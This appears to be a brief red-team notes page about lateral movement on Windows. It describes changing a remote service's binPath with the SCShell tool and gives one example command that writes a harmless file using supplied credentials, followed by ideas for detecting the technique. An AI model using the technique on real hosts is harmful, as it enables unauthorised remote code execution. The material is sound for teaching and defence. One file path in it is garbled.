# Lateral Movement via Service Configuration Manager

Source: https://www.ired.team/offensive-security/lateral-movement/lateral-movement-abusing-service-configuration-manager

## Overview

Execute commands on a remote host by abusing service configuration manager — change service `binPath` to a malicious command and restart the service. Automated by **SCShell**.

## Execution

SCShell syntax: `target, service, payload, username, domain, password`

```cmd
.\scshell.exe ws01 XblAuthManager "C:\windows\system32\cmd.exe /c echo 'lateral hello' > c:	emp\lat.txt" spotless offense 123456
```

## Detection Considerations

- Monitor services that change their `binPath` frequently
- Flag if new binPath is highly different (Levenshtein distance) from known-good value
- Alert on service configuration changes occurring over the network

## References

- https://github.com/Mr-Un1k0d3r/SCShell
